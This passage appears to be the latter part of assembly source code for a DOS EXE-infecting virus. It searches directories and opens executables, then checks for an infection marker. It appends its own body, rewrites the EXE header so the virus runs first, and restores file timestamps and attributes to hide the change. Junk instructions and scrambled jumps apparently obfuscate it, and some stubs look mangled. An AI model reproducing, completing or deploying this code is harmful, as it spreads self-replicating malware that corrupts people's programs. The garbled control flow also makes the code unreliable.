	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
	 mov ah,1AH 
		cmp 	dx,cx
JZ GPIJN
JMP AYOED
GPIJN:
JZ _B_ZA
JMP FF_GQ
_B_ZA:
JNZ DCB_F
JMP WKFDN
DCB_F:
	 int 21H
		JMP 	DCEQH
xor bx,cx
DCEQH:
	 mov ah,4FH
		cmp 	dx,bx
JZ FHI_I
JMP YITWG
FHI_I:
	 int 21H 
FF_GQ:
		call 	 _B_ZA
AYOED:
		call 	 GPIJN
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
YITWG:
		call 	 FHI_I
 	 xor al,al 

NEXTD3:
NEJVW:
		call 	 DAKKH
	 ret 
UMLFY:
		call 	 SQGNK


GET_DTA:
		JMP 	DQWAM
cmp ax,bx
cmp ax,bx
cmp ax,bx
DQWAM:
 mov dx,OFFSET DTA2
		JMP 	UMLFY
SQGNK:
 mov al,2BH
		cmp 	dx,ax
JNZ X_EZL
JMP PNJQW
X_EZL:
JNZ GWSWZ
JMP NSFKV
GWSWZ:
 mul [LEVEL]
 add dx,ax 
WKFDN:
		call 	 DCB_F
NSFKV:
		call 	 GWSWZ
 ret
PNJQW:
WBFFQ:
		call 	 XSLJB
		call 	 X_EZL


CONCAT:
	 mov al,byte ptr es:[di] 
		cmp 	ax,bx
JNZ JUSZQ
JMP GNUBB
JUSZQ:
JZ XSLJB
JMP WBFFQ
XSLJB:
JZ DAKKH
JMP NEJVW
DAKKH:
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
GNUBB:
		call 	 JUSZQ
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
	 ret 	 
CCQTD:
		call 	 TUBVJ


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
	 call IS_ID_THERE 

QWEXJ:
		call 	 EQPMC
OK_END: ret 	 


CHECK_SIG_OVERLAY:
		 mov al,’M’ 
JNZ TUBVJ
JMP CCQTD
TUBVJ:
JNZ EQPMC
JMP QWEXJ
EQPMC:
		 mov ah,’Z’
JZ _S_VU
JMP __URP
_S_VU:
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
__URP:
		call 	 _S_VU
	     ret 


GET_EXE_HEADER:
		JMP 	YOJCQ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
YOJCQ:
	 mov dx,OFFSET USEFILE
JZ NWCTB
JMP PDSDX
NWCTB:
	 mov ax,3D02H 
		JMP 	RCODN
HEGBP:
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR 
JZ VAKWK
JMP LVSQJ
VAKWK:
	 mov ah,3FH
	 int 21H

RE_RET: ret 
PDSDX:
		call 	 NWCTB
ORKHF:
		call 	 LYBHX
RCODN:
LVSQJ:
		call 	 VAKWK
		call 	 HEGBP
DCWKB:
		call 	 _BLXA


REL_ROOM:
	 mov ax,WORD PTR [EXE_HDR+8] 
		JMP 	ZCJTE
ERJBZ:
		cmp 	cx,ax
JZ _BLXA
JMP DCWKB
_BLXA:
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
ZCJTE:
		call 	 ERJBZ
	 cmp ax,4*NUMRELS 

RR_RET: ret     
XRYFN:
		call 	 MCSER
UNZQI:
		call 	 AFABZ


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
JZ MCSER
JMP XRYFN
MCSER:
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
JZ LYBHX
JMP ORKHF
LYBHX:
	 mul dx
	 mov cx,dx
	 mov dx,ax 
		cmp 	cx,ax
JZ AFABZ
JMP UNZQI
AFABZ:
		JMP 	SLHML
cmp cx,dx
SLHML:
	 mov bx,[HANDLE]
		JMP 	ZPMNH
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZPMNH:
	 mov ax,4200H 
	 int 21H
	 mov ah,3FH
		JMP 	JWZNL
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
JWZNL:
		JMP 	UADXD
cmp ax,bx
cmp ax,bx
UADXD:
	 mov bx,[HANDLE]
WLQOT:
	 mov dx,OFFSET VIDC
JNZ WPFYG
JMP WJQSM
WPFYG:
	 mov cx,2 
JNZ NUJPU
JMP _TRNT
NUJPU:
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
	 mov ax,[VIDC]
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
_TRNT:
		call 	 NUJPU
_ZFJM:
		call 	 QDYSD
WJQSM:
		call 	 WPFYG
	 stc 

II_RET: ret


SETBDY:
	 mov al,BYTE PTR [FSIZE]
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
	 sub cl,al 
	 mov dx,OFFSET FINAL
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
	 mov bx,[HANDLE]
	 mov ah,40H 
JNZ QDYSD
JMP _ZFJM
QDYSD:
	 int 21H

SB_E: ret


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
	 mov dx,WORD PTR [FSIZE]
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H 
	 call SETBDY 
	 mov cx,OFFSET FINAL 
	 xor dx,dx 
	 mov bx,[HANDLE] 
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
		JMP 	NDSOS
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
NDSOS:
	 mov bx,0
EV_XV:
	 adc cx,bx 
	 mov bx,[HANDLE]
SCDGD:
		JMP 	TUHDL
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
TUHDL:
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
	 mov bx,[HANDLE] 
TGYHH:
	 mov cx,2
AHDIC:
EYXGU:
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
		JMP 	UG_SY
xor bx,cx
xor bx,cx
xor bx,cx
UG_SY:
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1A 
	 inc bx 
	 add dx,bx
		JMP 	FM_DL
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
FM_DL:
	 mov bx,0
UTRKK:
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
KCFRD:
TXLOP:
	 int 21H
	 mov dx,OFFSET EXE_HDR+16 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
BNIPI:
FIEPP:
	 mov cx,WORD PTR [FSIZE+2]
XNBJG:
	 mov bx,OFFSET REL2 
	 add bx,1 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
BMUGD:
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
VGDWT:
	 mov bx,[HANDLE]
	 mov cx,4
AXRUJ:
	 mov ah,40H 
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
	 mov cl,4 
	 shr ax,cl 
		JMP 	EEYKA
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
EEYKA:
	 mov bx,WORD PTR [FSIZE+2]
XFGGV:
	 and bl,0FH
	 mov cl,4
QLQKF:
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
	 add bx,10H 
	 mov cl,4 
YFENY:
PUMUU:
JVNEJ:
	 shr bx,cl
	 add ax,bx
	 mov WORD PTR [EXE_HDR+14],ax 
		JMP 	WPUVH
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
WPUVH:
	 mov ax,OFFSET VIRUS 
	 mov WORD PTR [EXE_HDR+20],ax 
		JMP 	RSGAL
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
RSGAL:
	 mov ax,STACKSIZE 
LQOWK:
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
GQXSZ:
		JMP 	OCXPU
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
OCXPU:
	 mov dx,WORD PTR [FSIZE+2]
	 mov ax,WORD PTR [FSIZE] 
	 mov bx,OFFSET FINAL
KOL_I:
QOADT:
FYNGI:
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
	 mov cl,9
J_A_X:
	 shr ax,cl
	 mov cl,7
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
	 pop ax
	 and ax,1FFH 
	 mov WORD PTR [EXE_HDR+2],ax 
XFOAO:
DYUOY:
	 mov ax,NUMRELS 
DXZZJ:
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
GJJNG:
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
UVZJV:
	 mov ah,40H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+6] 
MJWAT:
	 dec ax 
	 dec ax 
		JMP 	_XCSD
nop
nop
nop
nop
nop
nop
nop
_XCSD:
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
		JMP 	KEUPM
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
KEUPM:
	 mov bx,0
	 adc dx,bx 
	 mov cx,dx
BEVGT:
	 mov dx,ax
TSRWE:
NU_LE:
	 mov bx,[HANDLE]
XDVMR:
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+22]
		JMP 	_UDOA
nop
nop
nop
nop
nop
nop
nop
_UDOA:
	 mov bx,OFFSET REL1 
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
		JMP 	QWLQX
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
QWLQX:
	 mov WORD PTR [EXE_HDR+2],ax 
_OQMD:
WHSZU:
	 mov ax,WORD PTR [EXE_HDR+22]
UEXHK:
JZ ITIPY
JMP IKXSV
ITIPY:
	 mov bx,OFFSET REL2
JNZ R_UUI
JMP CKKCU
R_UUI:
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
		JMP 	W_QHI
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
W_QHI:
	 mov WORD PTR [EXE_HDR+6],ax
	 mov cx,8 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
		cmp 	ax,dx
JZ XHROY
JMP HEHJQ
XHROY:
		JMP 	ZLGOR
RZOUH:
JNZ OIRWR
JMP JITYO
OIRWR:
	 mov ah,40H 
	 int 21H
ENMRB:
		call 	 ZSGUS
IKXSV:
		call 	 ITIPY
	 ret 

JITYO:
HEHJQ:
		call 	 XHROY
		call 	 OIRWR


CKKCU:
		call 	 R_UUI
TIMECT EQU 63 
ZLGOR:
		call 	 RZOUH


SHOULDRUN:
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
 	 ret ;
CQIYQ:
		call 	 TGZPF



SETSR:
	 mov al,90H 
JNZ TGZPF
JMP CQIYQ
TGZPF:
JNZ ZSGUS
JMP ENMRB
ZSGUS:
	 mov BYTE PTR SR1,al 
	 ret
NBXKU:
		call 	 BWIPW


NEW_DTA:
	 mov ah,2FH 
	 int 21H
	 mov WORD PTR [OLDDTA],bx
	 mov ax,es
	 mov WORD PTR [OLDDTA+2],ax
	 mov ax,cs
	 mov es,ax 
	 mov dx,OFFSET DTA1 
JNZ YTWDM
JMP KFICM
YTWDM:
	 mov ah,1AH
	 int 21H 
KFICM:
		call 	 YTWDM
ZL_UQ:
		call 	 PXRTK
	 ret

RESTORE_DTA:
	 mov dx,WORD PTR [OLDDTA] 
	 mov ax,WORD PTR [OLDDTA+2]
JNZ PXRTK
JMP ZL_UQ
PXRTK:
JZ BWIPW
JMP NBXKU
BWIPW:
	 mov ds,ax
	 mov ah,1AH
JZ KPYMD
JMP NMADE
KPYMD:
	 int 21H 
	 mov ax,cs 
	 mov ds,ax
BUSQT:
		call 	 DRSPI
YSYFF:
		call 	 _EYG_
BMMUB:
		call 	 TEJXK
QKBGR:
		call 	 MURRJ
NMADE:
		call 	 KPYMD
TNTJW:
		call 	 _JHIB
HNQYY:
		call 	 FOOLF
	 ret	 

SAVE_ATTRIBUTE:
	 mov ah,43H 
	 mov al,0
	 mov dx,OFFSET USEFILE
	 int 21H
	 mov [FATTR],cl 
	 mov ah,43H
	 mov al,1
		JMP 	HNQYY
FOOLF:
	 mov dx,OFFSET USEFILE
	 mov cl,0
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov al,2 
	 mov ah,3DH 
		JMP 	BUSQT
DRSPI:
	 int 21H
	 mov [HANDLE],ax 
		JMP 	TNTJW
_JHIB:
		JMP 	QKBGR
MURRJ:
JNZ TEJXK
JMP BMMUB
TEJXK:
	 mov ah,57H 
	 xor al,al
	 mov bx,[HANDLE]
JNZ _EYG_
JMP YSYFF
_EYG_:
	 int 21H
	 mov [FTIME],cx 
	 mov [FDATE],dx 
		JMP 	QUFMX
NYAIN:
		JMP 	OQLFL
WTDJK:
	 mov ax,WORD PTR [DTA1+28] 
		JMP 	GPNSU
HLYTS:
	 mov WORD PTR [FSIZE+2],ax 
	 mov ax,WORD PTR [DTA1+26] 
JNZ TYDAJ
JMP JGVJU
TYDAJ:
	 mov WORD PTR [FSIZE],ax
 	 ret
OQLFL:
		call 	 WTDJK
GPNSU:
JGVJU:
		call 	 TYDAJ
WMAUF:
		call 	 GWCGH
QUFMX:
		call 	 NYAIN
		call 	 HLYTS

IOGEA:
HXVOP:
		call 	 SZNST
		call 	 XGB_T


REST_ATTRIBUTE:
	 mov dx,[FDATE] 
JNZ GWCGH
JMP WMAUF
GWCGH:
	 mov cx,[FTIME]
JNZ XGB_T
JMP IOGEA
XGB_T:
		JMP 	_GFYI
cmp cx,dx
_GFYI:
	 mov ah,57H 
	 mov al,1
JZ SZNST
JMP HXVOP
SZNST:
		JMP 	BDMZI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
BDMZI:
	 mov bx,[HANDLE]
	 int 21H
	 mov ah,3EH
	 mov bx,[HANDLE]
		cmp 	ax,cx
JZ MCCKU
JMP _CHTV
MCCKU:
	 int 21H
	 mov cl,[FATTR]
	 xor ch,ch
		JMP 	ZOHWG
nop
nop
nop
nop
nop
ZOHWG:
	 mov ah,43H 
		JMP 	ZBOGC
xor bx,cx
xor bx,cx
xor bx,cx
ZBOGC:
	 mov al,1
JZ GJEDE
JMP EWLLL
GJEDE:
	 mov dx,OFFSET USEFILE
	 int 21H
EWLLL:
		call 	 GJEDE
_CHTV:
		call 	 MCCKU
	 ret

FINAL: 

VSEG ENDS 	 

VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
